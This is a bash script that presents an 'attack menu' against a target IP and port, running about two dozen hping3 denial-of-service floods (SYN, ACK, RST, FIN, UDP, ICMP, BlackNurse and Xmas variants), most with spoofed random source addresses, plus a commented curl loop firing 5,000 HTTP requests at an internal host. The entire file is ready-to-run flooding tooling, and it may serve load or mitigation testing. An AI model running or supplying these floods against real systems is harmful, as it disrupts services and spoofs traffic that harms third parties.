#!/usr/bin/bash

# usage: ./attack_menu.sh <IP> <PORT>

hping='/usr/sbin/hping3'


echo "*** ATTACK MENU ***"
echo "******************"
echo ""

IP=$1
if [ "$IP" == "" ]
 then
        echo "Enter Target IP as an Argument"
        exit
fi

PORT=$2
if [ "$PORT" == "" ]
 then
        echo "Enter Target PORT as an Argument"
        exit
fi

echo "Target: $IP:$PORT"
echo ""
ATTACK='Please chose your attack: '
options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-with-Timestamp" "SYN/ACK-Flood" "SYN/ACK-Flood-with-Timestamp" "ACK-Flood" "ACK-Flood-with-Timestamp" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "UDP-Flood-volumetric" "UDP-Flood-fragmented" "ICMP-Flood" "ICMP-Flood-volumetric" "BlackNurse1" "BlackNurse2" "BlackNurse3" "BlackNurse4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")

select opt in "${options[@]}"
do
    case $opt in
        "SYN-Flood")
                cmd="$hping -i u1 -S --rand-source -p $PORT $IP --tos 21 --ttl 33 -d 99"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "PUSH-Flood")
                cmd="$hping -P -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Push/Ack-Flood")
                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tos 23 --ttl 44 -d 12"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Push/Ack-Flood-with-Timestamp")
		cmd="$hping -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 78 --ttl 43 -d 37"
		echo "Running: "$cmd
                eval $cmd
                ;;
	"SYN/ACK-Flood")
		cmd="$hping -SA -p $PORT $IP --flood --rand-source --tos 12 --ttl 39 -d 90"
		echo "Running: "$cmd
                eval $cmd
		;;	
	"SYN/ACK-Flood-with-Timestamp")
		cmd="$hping -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 67 --ttl 134 -d 53"
		echo "Running: "$cmd
                eval $cmd
		;;
        "ICMP-Flood")
                cmd="$hping --icmp -i u1 $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ICMP-Flood-volumetric")
                cmd="$hping --icmp -i u1 -d 1300 $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tos 28 --ttl 124 -d 98"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood-with-Timestamp")
                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 132 -d 91"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "ACK-Flood-single_source")
                cmd="$hping --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 77 --ttl 167 -d 80"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "RST-Flood")
		cmd="$hping --rst -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "FIN-Flood")
                cmd="$hping --fin -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "UDP-Flood")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "UDP-Flood-volumetric")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source --data 1400"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "UDP-Flood-fragmented")
                cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source -x"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BlackNurse1")
                cmd="$hping --icmp -C 3 -K 0 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BlackNurse2")
                cmd="$hping --icmp -C 3 -K 3 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BlackNurse3")
                cmd="$hping --icmp -C 8 -K 0 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "BlackNurse4")
                cmd="$hping --icmp -C 8 -K 3 --flood $IP --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "X-MAS-Flood")
                cmd="$hping --xmas -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Y-MAS-Flood")
                cmd="$hping --ymas -p $PORT $IP --flood --rand-source"
		echo "Running: "$cmd
		eval $cmd
                ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
# for i in {1..5000}; do curl -v --header "Host: whatever" http://10.128.10.80/whatever$i; done
